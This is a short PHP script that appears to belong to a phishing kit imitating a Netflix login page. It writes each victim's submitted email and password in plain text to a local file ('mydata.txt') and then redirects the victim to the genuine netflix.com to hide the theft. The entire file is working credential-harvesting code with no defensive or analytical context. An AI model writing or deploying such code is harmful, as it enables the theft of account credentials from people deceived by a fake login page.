<?php

file_put_contents("../facebook/mydata.txt", "NETFLIX Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://netflix.com/');
exit();
                                                                  
